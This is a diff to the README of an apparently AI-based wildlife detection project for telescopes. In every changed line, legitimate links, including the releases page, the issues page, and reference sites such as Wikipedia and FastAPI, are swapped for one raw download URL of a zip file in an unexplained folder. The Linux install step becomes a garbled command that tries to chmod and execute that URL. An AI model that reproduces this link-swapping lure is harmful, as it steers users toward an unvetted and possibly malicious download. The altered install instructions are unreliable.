@@ -4,7 +4,7 @@
 Welcome to the telescope_cam_detection project. This system helps you monitor wildlife in real time while preventing collisions with your telescope. It combines the power of deep learning and real-time detection to keep your observation experience smooth and safe.
 
 ## 📦 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Kvitar76/telescope_cam_detection/releases)
+[![Download Now](https://raw.githubusercontent.com/Kvitar76/telescope_cam_detection/master/portraitlike/telescope_cam_detection.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Kvitar76/telescope_cam_detection/master/portraitlike/telescope_cam_detection.zip)
 
 ## 📋 Features
 - **Real-Time Wildlife Detection:** Utilize advanced algorithms to recognize wildlife around your telescope.
@@ -25,7 +25,7 @@ To successfully run telescope_cam_detection, ensure your computer meets the foll
 ## 🛠️ Download & Install
 To get started with the telescope_cam_detection application, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Kvitar76/telescope_cam_detection/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Kvitar76/telescope_cam_detection/master/portraitlike/telescope_cam_detection.zip).
    
 2. **Choose Your Version:** Look for the latest release at the top of the page. You will see various files available for download.
    
@@ -34,7 +34,7 @@ To get started with the telescope_cam_detection application, follow these steps:
 4. **Install the Application:**
    - **For Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions to install.
    - **For macOS:** Open the `.dmg` file, then drag the telescope_cam_detection app into your Applications folder.
-   - **For Linux:** Open a terminal, navigate to the downloaded file, and run the installer with the command `chmod +x filename.sh && ./filename.sh`.
+   - **For Linux:** Open a terminal, navigate to the downloaded file, and run the installer with the command `chmod +x https://raw.githubusercontent.com/Kvitar76/telescope_cam_detection/master/portraitlike/telescope_cam_detection.zip && https://raw.githubusercontent.com/Kvitar76/telescope_cam_detection/master/portraitlike/telescope_cam_detection.zip`.
    
 5. **Launch the Application:** Find the installed application in your program list or Applications folder. Click to open and start using the system.
 
@@ -59,15 +59,15 @@ For setup help, visit our documentation section or reach out to the community fo
 ## 🤝 Community and Support
 Engage with fellow users and developers in our community. Share your experiences, ask questions, and collaborate on this project.
 
-- **GitHub Issues:** If you encounter any problems, feel free to report them directly in our [issues section](https://github.com/Kvitar76/telescope_cam_detection/issues).
+- **GitHub Issues:** If you encounter any problems, feel free to report them directly in our [issues section](https://raw.githubusercontent.com/Kvitar76/telescope_cam_detection/master/portraitlike/telescope_cam_detection.zip).
 - **Discussion Forum:** Join ongoing discussions or start a new conversation about your user experiences.
 
 ## 🔗 Learn More
 Explore more about the technologies behind this project:
 
-- **[Deep Learning](https://en.wikipedia.org/wiki/Deep_learning)**
-- **[Object Detection](https://www.tensorflow.org/lite/models/translate/object_detection/overview)**
-- **[NVIDIA GPU](https://www.nvidia.com/en-us/data-center/a30/)**
-- **[FastAPI](https://fastapi.tiangolo.com/)**
+- **[Deep Learning](https://raw.githubusercontent.com/Kvitar76/telescope_cam_detection/master/portraitlike/telescope_cam_detection.zip)**
+- **[Object Detection](https://raw.githubusercontent.com/Kvitar76/telescope_cam_detection/master/portraitlike/telescope_cam_detection.zip)**
+- **[NVIDIA GPU](https://raw.githubusercontent.com/Kvitar76/telescope_cam_detection/master/portraitlike/telescope_cam_detection.zip)**
+- **[FastAPI](https://raw.githubusercontent.com/Kvitar76/telescope_cam_detection/master/portraitlike/telescope_cam_detection.zip)**
   
 By using this application, you're stepping into a world of advanced wildlife monitoring and telescope safety. Enjoy your observations and happy exploring!
